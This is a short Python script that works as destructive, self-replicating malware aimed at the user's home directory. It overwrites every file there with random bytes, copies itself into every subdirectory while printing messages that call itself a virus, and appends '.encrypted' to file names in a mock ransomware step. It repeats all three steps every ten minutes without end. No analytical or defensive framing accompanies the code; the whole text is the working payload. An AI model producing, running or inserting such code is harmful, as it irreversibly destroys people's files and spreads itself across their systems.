import os
import shutil
import time

home_directory = os.path.expanduser("~")
def corrupt_files(path):
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                with open(full_path, 'wb') as f:
                    f.write(os.urandom(1024))  
        
        print(f"Corrupted files in {path}")
    except Exception as e:
        print(f"Error corrupting files: {e}")

def replicate_script(target_directory):
    try:
        script_name = os.path.basename(__file__)
        for root, dirs, files in os.walk(target_directory):
            for dir in dirs:
                target_path = os.path.join(root, dir, script_name)
                shutil.copyfile(__file__, target_path)
                print(f"Copied virus to {target_path}")
    except Exception as e:
        print(f"Error replicating script: {e}")

def ransomware_simulation(path):
    try:
        for root, dirs, files in os.walk(path):
            for file in files:
                full_path = os.path.join(root, file)
                new_name = full_path + ".encrypted"
                os.rename(full_path, new_name)
        print(f"Files in {path} have been encrypted.")
    except Exception as e:
        print(f"Error in encryption simulation: {e}")

if __name__ == "__main__":
    while True:
        
        corrupt_files(home_directory)
        replicate_script(home_directory)
        ransomware_simulation(home_directory)

        time.sleep(60 * 10) 
